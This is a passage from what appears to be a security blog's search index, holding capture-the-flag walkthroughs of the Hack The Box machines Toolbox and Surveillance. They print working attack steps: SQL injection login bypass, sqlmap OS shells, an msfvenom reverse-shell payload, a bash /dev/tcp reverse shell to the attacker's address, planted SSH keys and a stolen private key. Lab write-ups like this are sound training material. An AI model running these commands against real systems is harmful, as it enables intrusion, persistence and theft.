A good cryptographic signature relies on a key that remains private (for at least the whole duration of when a signature needs to be valid). If that key gets leaked, the whole system falls apart. Perhaps the server didn&rsquo;t even use a key - it just &ldquo;signed&rdquo; the data as-is, perhaps just by hashing it. I encountered exactly this situation when doing the HTB machine Download. Please see my walkthrough on that box for more detail. I created a handy tool for performing cookie signatures using NodeJS + Express for that box (plus an bonus tool that abused the authentication mechanism to enumerate valid usernames on the system &#x1f609;)
Another excellent tool for this is Cookiemonster. It&rsquo;s very versatile, working for several different frameworks and encodings. Please check out their repo for more detail.
JWT Key Confusion This is an attack that I utilized on a (now retired) HTB machine Cybermonday. At a high level, it depends on a server&rsquo;s misconfiguration such that it might misinterpret part of a JWT*, such as the part that specifies the key algorithm*.
This attack is a little more complicated, so please refer to that section of my walkthrough of Cybermonday for more detail.
MANY MORE TODO:
Remember Me abuse Fiddling with the request header (bypass technique) Refreshing a login token but actually grabbing somebody else&rsquo;s (also a bypass) `,url:"https://4wayhandshake.github.io/strategy/login-forms/"},"https://4wayhandshake.github.io/walkthrough/toolbox/":{title:"Toolbox",tags:["Authentication Bypass","SQLi (Blind)","Docker","Default Credentials"],categories:["Walkthrough","HTB","Windows","Easy"],content:`INTRODUCTION Continuing on with my “Let’s brush up on Windows!” series, Toolbox is the fourth box. For the previous one, see my walkthrough on Buff. Unfortunately, while this box was advertised as Windows, it&rsquo;s actually 100% Linux. Yes, a little disappointing, but it&rsquo;s still good practice. It might not seem like it right away, but if you have some experience with sqlmap, then Toolbox will be a breeze.
Recon was very short; you are only meant to find one thing, and it appears right away. To gain a foothold, just apply a little ffuf-fu and sqlmap will bridge the gap. The foothold brings you straight to the user flag. From there, take a moment to fingerprint the system in front of you: a little bit of research about the system goes a long way. If you want to finish up quickly, you don&rsquo;t even need to pwn the system to gain the root flag.
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 5985/tcp open wsman 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 49669/tcp open unknown Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe | ftp-syst: |_ SYST: UNIX emulated by FileZilla 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA) | 256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA) |_ 256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.38 ((Debian)) |_http-title: MegaLogistics | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.38 (Debian) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR | Not valid before: 2020-02-18T17:45:56 |_Not valid after: 2021-02-17T17:45:56 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 28s | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2024-02-14T09:39:58 |_ start_date: N/A Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR (No significant results)
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
PORT STATE SERVICE VERSION 123/udp open|filtered ntp 137/udp open|filtered netbios-ns 138/udp open|filtered tcpwrapped 427/udp open|filtered svrloc 500/udp open|filtered isakmp 520/udp open|filtered route 623/udp open|filtered asf-rmcp 626/udp open|filtered serialnumberd 1813/udp open|filtered tcpwrapped 2223/udp open|filtered tcpwrapped 4444/udp open|filtered tcpwrapped 4500/udp open|filtered tcpwrapped 5353/udp open|filtered zeroconf Note that any open|filtered ports are either open or (much more likely) filtered.
FTP strategy In my experience, an FTP server with anonymous login is often the best thing to check first on a box. The nmap script scan showed that anonymous login is enabled, so it&rsquo;s possible to log in with the credentials anonymous : [blank]:
As noted by nmap, there is just a single file inside: docker-toolbox.exe. It&rsquo;s huge, so I&rsquo;ll start downloading it now (FTP command get) and proceed with enumeration while that&rsquo;s going.
&#x261d;&#xfe0f; There are many ways to connect to an FTP server. You can use FTP from the terminal, or a full GUI like FileZilla.
For this box, I actually just used my file explorer Thunar to anonymously connect and transfer the file: to do this, just enter the address ftp://10.10.10.236 in the path bar, and Thunar will prompt you for the rest.
SMB Something even better than an anonymous FTP login is anonymous SMB. SMB has a lot more features than FTP, and can even be utilized for RCE if it&rsquo;s very poorly-configured. Unfortunately, this box has no anonymous login for smb, and the guest account is disabled:
Webserver strategy Noting the certificate details from the nmap scan, I added megalogistic.com and admin.megalogistic.com to /etc/hosts. I don&rsquo;t love the fact that I&rsquo;m attacking a target with a .com TLD &#x1f440; Regardless, I did banner grabbing on that domain:
DOMAIN=megalogistic.com echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts echo &#34;$RADDR admin.$DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb https://$RADDR &amp;&amp; curl -kIL https://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results from that. Now I&rsquo;ll check for subdomains of megalogistic.com (using a vhost scan):
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v Unsurprisingly, there is an admin page (see nmap script scan). There were also a few results of size 0 that I didn&rsquo;t show in the image. I&rsquo;ll move on to directory enumeration on https://megalogistic.com:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; gobuster dir -w $WLIST -u https://$DOMAIN -k \\ --random-agent -t 60 --timeout 5s -f -e \\ --status-codes-blacklist 400,401,402,403,404,405 \\ --output &#34;fuzzing/directory-gobuster-$DOMAIN.txt&#34; \\ --no-error No results from that, except for the index page. What about the subdomain https://admin.megalogistic.com?
gobuster dir -w $WLIST -u https://admin.$DOMAIN -k \\ --random-agent -t 60 --timeout 5s -f -e \\ --status-codes-blacklist 400,401,402,403,404,405 \\ --output &#34;fuzzing/directory-gobuster-admin.$DOMAIN.txt&#34; \\ --no-error No results from that either.
Exploring the Website The landing page at https://megalogistic.com is mostly uninteresting. I&rsquo;ll go straight to the admin page, where I&rsquo;m presented with a login.
Brute force the login Just to eliminate the obvious, I&rsquo;ll check for simple credentials by running Hydra against this login page. First, I&rsquo;ll intercept the login request with Burp so that I can tailor my Hydra usage to match it:
I&rsquo;ll also Forward that request, so that I can see what a failure looks like (It shows &ldquo;Login failed&rdquo; at the bottom of the form). Also, note that I&rsquo;m using the Hydra -S flag to enable SSL.
USERS=/usr/share/seclists/Usernames/top-usernames-shortlist.txt PASSWORDS=/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt hydra -L $USERS -P $PASSWORDS -S admin.megalogistic.com https-post-form &#34;/login:username=^USER^&amp;password=^PASS^:H=Cookie: PHPSESSID=04f330734b942b0d6e27d338dc63c319:F=Login failed&#34; Hydra can be very frustrating to use, due to its lack of documentation and arcane syntax. I&rsquo;d like to highlight the following from the above command:
Use method https-post-form, not http-post-form, along with the -S option Provide the cookie as a portion of the header (:H=Cookie: key1=val1; key2=val2) The filter string (:F=text you see if authentication failed) must be after the cookie Hydra did not find any valid credentials with this method.
Authentication bypass Since this is an Apache website using PHP, there&rsquo;s a good chance that the backend database uses SQL. If it&rsquo;s poorly-written, we might have a simple authentication bypass using SQL injection.
WLIST=/usr/share/seclists/Fuzzing/Databases/sqli.auth.bypass.txt ffuf -w $WLIST:FUZZ -u https://admin.megalogistic.com/ -k \\ -X POST -t 40 -c \\ -H &#34;Content-Type: application/x-www-form-urlencoded&#34; \\ -d &#34;username=FUZZ&amp;password=admin&#34; \\ -fr &#39;Login failed&#39; &#x1f913; Some people forget that ffuf is great for a lot more than vhost and directory enumeration. I&rsquo;ve used it successfully for all kinds of other things, such as API fuzzing, directory traversal, LFI enumeration, and SQL injection.
This scan with ffuf was hugely successful:
You can check by running it with the -v flag, but all of these HTTP 302 results redirect to /dashboard.php &#x1f638;
Dashboard The dashboard opens to a couple of &ldquo;ToDo&rdquo; notes that provide useful hints(hopefully &#x1f91e;):
Ouch, the CSS on this dashboard was really scrapped together. Although, checking out the developer&rsquo;s website, it seems that this project was very early-days for them learning frontend dev. Everybody has to start somehwere! Regardless, if you click on the Orders tab (the &ldquo;people&rdquo; icon ) you can fix the lack of scrolling on the table by selecting this element and setting overflow: scroll on it from your browser&rsquo;s dev tools, allowing you to see the rest of the orders in the table.
There was no mention of &ldquo;Tony&rdquo; in the other two tabs. However, the printer driver thing might be important: I&rsquo;ll go back and check those two UPnP http listeners that were discovered in the script scan.
Looking for printer &#x1f6ab; Wrong way. Skip this section if you are short on time.
I&rsquo;ll run the UPnP nmap script against the two ports identified in the script scan:
nmap --script &#34;upnp-info&#34; -p 5985,47001 $RADDR The result was not very helpful:
PORT STATE SERVICE 5985/tcp open wsman 47001/tcp open winrm These two ports are listening for HTTP. Perhaps I&rsquo;ll try enumerating them?
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$RADDR:5985/FUZZ -t 80 -c -e php,asp,js,html -timeout 4 -v ffuf -w $WLIST:FUZZ -u http://$RADDR:47001/FUZZ -t 80 -c -e php,asp,js,html -timeout 4 -v FOOTHOLD SQLi Since the authentication bypass was successful, there are clearly some security holes in the way that the website is handling SQL. Why not try a more comprehensive SQLi - either to enumerate the database or to gain RCE? First, I&rsquo;ll try for RCE
sqlmap -u &#34;https://admin.megalogistic.com&#34; --cookie=&#34;PHPSESSID=04f330734b942b0d6e27d338dc63c319&#34; --os-shell --force-ssl Note that the --force-ssl option was provided. When prompted, default options were chosen at every step. In the future I&rsquo;ll use the --batch option with sqlmap.)
&#x1f389; The SQLi was successful using four different methods:
Excellent! I have a shell. At this point, I&rsquo;ll try to form a reverse shell.
&#x1f6ab; This part was a mistake. Skip both of the following numbered sections if you&rsquo;re short on time.
Generate a reverse shell payload
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4446 X &gt; revshell.exe Start a webserver from my attacker box, serving the payload exe
sudo ufw allow from $RADDR to any port 4444,8000 proto tcp python3 -m http.server 8000 Using the shell I just got from the SQLi, try contacting my python webserver (just to see if it can connect):
wget http://10.10.14.9:8000 # No request received. curl http://10.10.14.9:8000 # Yep! python http.server shows a request Use successful method to download the payload
curl -o revshell.exe http://10.10.14.9:8000/revshell.exe It&rsquo;s odd that I&rsquo;m not getting any output from these commands. Only the curl command showed any output. Things like dir and where are not working at all. Why would that be?
&#x1f926;&zwj;&#x2642;&#xfe0f; Oh wow. I feel a little silly - this whole time my shell has been in linux!. I got output from curl because the syntax is identical between Windows cmd and Linux sh.
Let&rsquo;s try that again, but assuming a Linux target:
Start up a reverse shell listener on the attacker box:
# Open the firewall sudo ufw allow from $RADDR to any port 4444 proto tcp bash rlwrap nc -lvnp 4444 Open the os-shell using sqlmap:
sqlmap -u &#34;https://admin.megalogistic.com&#34; --os-shell --batch --forms --force-ssl Using the shell from sqlmap, connect back to the listener on my attacker box:
bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.9/4444 0&gt;&amp;1&#34; USER FLAG Postgres in container The os-shell from sqlmap or a reverse shell spawned from it are functionally the same. Either drops you into the directory /var/lib/postgresql/11/main as the user postgres. We&rsquo;re clearly in a docker container - uname -a shows:
Linux bc56e3cc55e9 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux What are the important users?
id &amp;&amp; cat /etc/passwd | grep -v nologin | grep -v /bin/false root:x:0:0:root:/root:/bin/bash postgres:x:102:104:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash Oh wow, looks like postgres has a home directory - I&rsquo;ll check if they have a flag: cd ~; ls -laH.
&#x1f370; Yep! The flag is right there. Just cat it for some points.
cat user.txt ROOT FLAG Getting into postgres As the user postgres I checked for listening processes:
netstat -tulpn There is a \`\`PostgreSQLdatabase listening locally on port 5432. Normally, I'd simply open a proxy for the local database, so that I can access it remotely from my attacker box. However, since I'm working out of thesqlmapshell, that strategy presents a few complication. It's easier and more direct to simply read the database usingsqlmap\` itself.
First, let&rsquo;s check what databases exist:
sqlmap -u &#34;https://admin.megalogistic.com&#34; --batch --forms --dbs [*] information_schema [*] pg_catalog [*] public information_schema and pg_catalog are standard for a PostgreSQL database. Let&rsquo;s read public and see what&rsquo;s inside.
sqlmap -u &#34;https://admin.megalogistic.com&#34; --batch --forms -D public --tables Database: public [1 table] +-------+ | users | +-------+ Super! Finally, let&rsquo;s check what&rsquo;s inside by dumping the table:
sqlmap -u &#34;https://admin.megalogistic.com&#34; --batch --forms -D public -T users --dump Database: public Table: users [1 entry] +----------------------------------+----------+ | password | username | +----------------------------------+----------+ | 4a100a85cb5ca3616dcf137918550815 | admin | +----------------------------------+----------+ Nice, that looks like an unsalted password hash. I tossed it into crackstation.net to see if I could get away with not even cracking it. No luck there. I&rsquo;ll identify the hash type then start cracking:
&#x1f914; Hmm&hellip; I ran the hash through both john and hashcat, but didn&rsquo;t get any result. I&rsquo;ll come back to this hash later - for now try to find another way forward.
docker-toolbox.exe Well, now that I know I&rsquo;m inside a docker container, it suddenly feels a lot more relevant to check out that docker-toolbox.exe that I downloaded from the FTP server
A little bit of research showed that Docker Toolbox was the predecessor to Docker Desktop for Windows, but is now long-obsolete. Reading through the docker archive / toolbox repo on Github, I&rsquo;ve discovered that every release of docker toolbox came bundled with an .iso image of Boot2Docker.iso and virtualbox.
&#x1f440; Does Docker on Windows not use overlayFS?! It&rsquo;s hard to see the advantage over a traditional VM, if it simply uses a .iso format.
&#x1f514; &ldquo;boot2docker&rdquo; might ring a bell - it&rsquo;s the flavour of linux that is used for this container: 4.14.154-boot2docker. A little more searching led to the Github repo for boot2docker. Halfway down the README, the default credentials are listed:
Ok, so there should be SSH credentials. I&rsquo;ll see if the default docker user is on the host machine. First, I&rsquo;ll get the address of the host:
# Check interfaces within the container ifconfig # Check routes arp -va ? (172.17.0.1) at 02:42:91:33:c3:db [ether] on eth0 Entries: 1 Skipped: 0 Found: 1 Great, I&rsquo;ll try to connect over ssh to that, using the credentials docker : tcuser:
Huh? Oh, I see: I need to upgrade my reverse shell into a terminal before I can even attempt to use SSH &#x1f4a1;. Please see my guide on upgrading the shell for more detail. For this, I used a regular bash upgrade:
SHELL=/bin/bash script -q /dev/null The SSH attempt worked perfectly after that. If I&rsquo;m understanding correctly, I&rsquo;ve now pivoted from the postgres user (in the docker container) into the docker user (in the VM that is running the container).
Persistence: docker &#x1f6ab; Wrong way. Skip this section if you&rsquo;re short on time.
My reverse shell keeps dying after approximately a minute, so I&rsquo;m very eager to establish a more persistent way to access the target. Redoing the whole sqlmap &gt; reverse shell &gt; shell upgrade &gt; ssh chain is getting quite tedious. Thankfully, when I initially gained access I quickly checked the home directory of docker:
I&rsquo;ll prepare an SSH key and plant it into both authorized_keys files. First, on my attacker box, I&rsquo;ll generate a key and base-64 encode it:
# used passphrase &#34;3agle&#34;: ssh-keygen -t rsa -b 4096 chmod 700 ./id_rsa # copy output to clipboard base64 -w 0 id_rsa.pub &gt; id_rsa.pub64 &amp;&amp; cat id_rsa.pub64 Then, on the target box, make an SSH directory and plant the key:
cd ~/.ssh echo &#34;ssh-rsa AAAAB3...obw== kali@kali&#34; &gt;&gt; authorized_keys echo &#34;ssh-rsa AAAAB3...obw== kali@kali&#34; &gt;&gt; authorized_keys2 Now back on the attacker box, go ahead and connect using SSH:
ssh -i ./id_rsa docker@$RADDR Hmm&hellip; It still is not working. Is my reverse shell still in the docker container?
Whatever. I&rsquo;ll proceed and just try to move fast (before the reverse shell dies again) &#x1f937;&zwj;&#x2642;&#xfe0f;
Enumeration: docker It looks like docker can sudo anything without a password; it seems that (at least inside this container) I have full access.
The home directory &#x1f6ab; Wrong way. Skip this section if you&rsquo;re short on time.
Taking a look inside ~/.docker, there are three .pem files. One of them, key.pem looks like it is an RSA key, so I might be able to log in using that key. I copied and pasted the contents to a local version of key.pem on my attacker box. I&rsquo;ll start up PuTTY and try it out:
Specify the IP address under Session Under Connection &gt; SSH &gt; Auth &gt; Credentials, browse to and select key.pem Under Session again, give the session a name (&ldquo;Toolbox&rdquo; is fine), and click Save Finally, click Open Nope! I guess those keys and certs weren&rsquo;t actually useful.
root directory Checking out the root directory / shows something very peculiar. &#x1f914; This &ldquo;c&rdquo; directory is not standard Linux:
Oh nice! Inside is the directory Users. It&rsquo;s part of a Windows filesystem &#x1f44f; And the root flag is sitting there in plain view:
EXTRA CREDIT: FULL PWN Administrator SSH key Under /c/Users/Administrator there is (like docker) a .ssh directory containing a private key:
I&rsquo;ll copy this over to my attacker box and see if I can log in with it.
# paste the above key into loot/id_rsa chmod 700 loot/id_rsa ssh -i loot/id_rsa Administrator@$RADDR &#x1f352; Alright! a nice SSH connection for Administrator. You can type the root flag now if you haven&rsquo;t already obtained it.
LESSONS LEARNED Attacker When authentication bypass using SQLi is possible, RCE is likely also possible . The SQLi authentication bypass is evidence of faulty handling of user inputs that communicate with a database. As soon as the auth bypass is discovered, point sqlmap at it and see what it can do. Hashes aren&rsquo;t always useful. Thankfully, the hash that I recovered on this box was likely either MD5 or NTLM, both of which are very very fast to compute. Hence, I was able to run it through even my largest password wordlists in a matter of seconds. After doing that, I was quite confident that I wasn&rsquo;t &ldquo;meant&rdquo; to crack that hash. Keys aren&rsquo;t always useful. Again, thankfully, it was easy to eliminate the possibility of them being useful - all I had to do was attempt a few SSH logins. Check for default credentials. This is especially useful for software that is a little old (say, pre-2018?), or software that the developer thought would never be exposed to the public-facing internet. There are plenty of wordlists in Kali to help with this, but the best resource is still just a simple web search. Defender Defense in depth is an important paradigm. This box failed to change default credentials on an important service, and this led to us escalating our way out of the docker container. While it may have seemed to the developer that the host VM would never be exposed to public-facing internet, the truth is that their usage of default credentials made the escalation completely trivial.
Keep filesystems separate. Having a shared volume between a host system and a VM can be very convenient, but it should be removed whenever the system goes in to Production.
`,url:"https://4wayhandshake.github.io/walkthrough/toolbox/"},"https://4wayhandshake.github.io/walkthrough/surveillance/":{title:"Surveillance",tags:["Craft CMS","Imagick","ZoneMinder","Perl"],categories:["Walkthrough","HTB","Linux","Medium"],content:`INTRODUCTION At the time of writing this walkthrough, Surveillance is still an active box. This one is all about breaking into a fictional company called that installs and operates physical security systems, such as security cameras and door access control. Surveillance is slightly long for a Medium box, involving many rabbit-holes and escalation between three users. However, if you keep your checklists handy and take good notes, this box won&rsquo;t be too challenging.
Recon on this one is trivial, although it&rsquo;s easy to accidentally get bogged-down with too much enumeration. Finding the method for a foothold is very simple, but exploiting it might be challenging (luckily, I found some perfect PoC code). The user flag is more challenging, requiring escalation to yet another user - my recommendation: poke around the filesystem manually a bit before you do too much automatic enumeration.
The process for finding the user flag has several rabbit-holes. However, at this stage you&rsquo;re actually able to escalate to two different users! While the privesc vector to root is very obvious, obtaining the root flag is much more challenging if you don&rsquo;t know what you&rsquo;re looking for - it requires careful analysis of a large body of code; be creative and try lots of different methods to abuse the code you find. In my case, it was only after researching the errors from my various privesc attempts that eventually led me to the flag.
RECON nmap scans For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA) |_ 256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://surveillance.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA) |_ 256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://surveillance.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
PORT STATE SERVICE VERSION 68/udp open|filtered tcpwrapped 161/udp open|filtered snmp 500/udp open|filtered isakmp 593/udp open|filtered tcpwrapped 623/udp open|filtered asf-rmcp 1027/udp open|filtered unknown 1029/udp open|filtered solid-mux 1434/udp open|filtered ms-sql-m 5060/udp open|filtered sip 10000/udp open|filtered ndmp 30718/udp open|filtered tcpwrapped 49182/udp open|filtered unknown 49190/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy Noting the redirect from the nmap scan, I added surveillance.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=surveillance.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Looks like a redirect to http://surveillance.htb. It&rsquo;s powered by Craft CMS, that&rsquo;s not super common (at least from what I&rsquo;ve seen).
Depending on the version, Craft CMS might have some vulnerabilities: Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v Alright, that&rsquo;s the one I already knew about - nothing else though. Now I&rsquo;ll check for subdomains of surveillance.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results from that. I&rsquo;ll move on to directory enumeration on http://surveillance.htb. This time I&rsquo;ll use gobuster:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; gobuster dir -w $WLIST -u http://$DOMAIN \\ --random-agent -t 60 --timeout 5s -f -e \\ --status-codes-blacklist 400,401,402,403,404,405 \\ --output &#34;fuzzing/directory-gobuster-$DOMAIN.txt&#34; \\ --no-error Directory enumeration against http://surveillance.htb/ gave the following:
&#x1f605; HTTP 418, nice. Apparently when we visit /wp-admin the server becomes a teapot. Truly the original IOT! That&rsquo;s a whole lot of noise though. I&rsquo;ll try ffuf instead:
ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ \\ -t 80 -c -o fuzzing/directory-ffuf-$DOMAIN \\ -of json -e php,asp,js,html -timeout 4 The scan isn&rsquo;t complete yet, but the above results are already a little more helpful. It also found the main .htaccess file. Typically, this file shouldn&rsquo;t be publicly visible:
&lt;IfModule mod_rewrite.c&gt; RewriteEngine On # Send would-be 404 requests to Craft RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_URI} !^/(favicon\\.ico|apple-touch-icon.*\\.png)$ [NC] RewriteRule (.+) index.php?p=$1 [QSA,L] &lt;/IfModule&gt; I wasn&rsquo;t familiar with how that final rule worked, so I asked ChatGPT about it. The info it provided was very informative:
RewriteRule: This indicates that a rewrite rule is being defined. (.+): This is a regular expression pattern that captures one or more characters (.+) and stores them in a backreference. This part captures the path information from the requested URL. index.php?p=$1: This is the substitution part of the rule. It rewrites the URL to the specified target. In this case, it rewrites to index.php with a query parameter p set to the value captured by the regular expression pattern ($1, the first and only backreference). [QSA,L]: These are flags that modify the behavior of the rule: QSA (Query String Append): This flag appends the original query string to the rewritten URL. For example, if the original URL was example.com/page?param=value, the rewritten URL would become index.php?p=page&amp;param=value. L (Last): This flag indicates that if this rule is applied, no further rules should be processed for this request. LFI Enumeration &#x1f6ab; Wrong way. Skip this part if you are short on time.
Perhaps this is indicative of a possible LFI? I&rsquo;ll try pointing my new directory traversal and LFI tool, Alfie, at /index.php?p= and see if it comes up with anything:
Alfie is a bit like what you might get if you mixed dotdotpwn and ffuf together &#x1f609;
No positive results. When I checked the --verbose output of Alfie, I realized that all of the requests were yielding responses of different sizes. To investigate, I checked out the page source and discovered one use for the /index.php?p= query:
Fuzzing p=actions/ &#x1f6ab; Wrong way. Skip this part if you are short on time.
There appears to be a page /index.php?p=actions/ that I haven&rsquo;t seen yet. I&rsquo;ll check that out next, but first I&rsquo;ll fuzz that ?p= parameter:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/index.php?p=FUZZ \\ -t 80 -c -o fuzzing/p-parameter-ffuf-index \\ -of json -e php,js,html -timeout 4 The result was the same as the directory and file enumeration that I did earlier. However, that page /index.php?p=actions/ has a slash on the end - maybe it is some kind of API with multiple actions? If that&rsquo;s the case, I should be able to find some of those actions with yet another ffuf scan:
ffuf -w $WLIST:FUZZ -u http://$DOMAIN/index.php?p=actions/FUZZ \\ -t 80 -c -o fuzzing/actions-ffuf-index -of json -timeout 4 -b &#39;CRAFT_CSRF_TOKEN=4e3489f3e3624b4f8e55b2310c59186d949d301a4e870b837657b30be40b9ed8a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22tmmFkE9eUUFhFzB_B8Ti0nW5EodX58Ldkk-i2s29%22%3B%7D; CraftSessionId=99j6etlacb381u7078cv8kukf2&#39; -mc all -fw 352 -fs 0 &#x261d;&#xfe0f; After proxying a few requests to surveillance.htb through Burp, I noticed that there is a CSRF token and a CraftSessionID, and that both of these seem static.
Just to be safe, I included them in the ffuf scan.
Very interesting! I checked each of the pages. /index.php?p=actions/install showed a simple message:
All of the pages with a HTTP 403 Unauthorized code show the same thing. Interesting mostly because it implies that there are proper credentials that exist (I just don&rsquo;t have them yet!):
